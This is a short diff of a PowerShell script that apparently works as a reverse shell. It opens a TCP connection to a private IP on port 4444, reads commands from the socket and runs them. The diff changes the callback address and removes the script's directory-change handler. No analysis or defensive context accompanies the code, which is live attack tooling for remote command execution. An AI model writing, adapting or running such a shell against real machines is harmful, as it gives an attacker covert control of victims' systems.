@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TcpClient("10.57.182.250",4444)
+$client = New-Object System.Net.Sockets.TcpClient("10.57.65.239",4444)
 $stream = $client.GetStream()
 
 $reader = New-Object System.IO.StreamReader($stream)
@@ -45,20 +45,6 @@ while ($true) {
                 $output = ls $arguments | Out-String
             } else {
                 $output = ls | Out-String
-            }
-        }
-
-        "cd" {
-            if ($arguments) {
-                try {
-                    Set-Location $arguments -ErrorAction Stop
-                    $output = "Changed directory to: $(Get-Location)"
-                }
-                catch {
-                    $output = "Error: Could not change directory."
-                }
-            } else {
-                $output = "Current directory: $(Get-Location)"
             }
         }
 
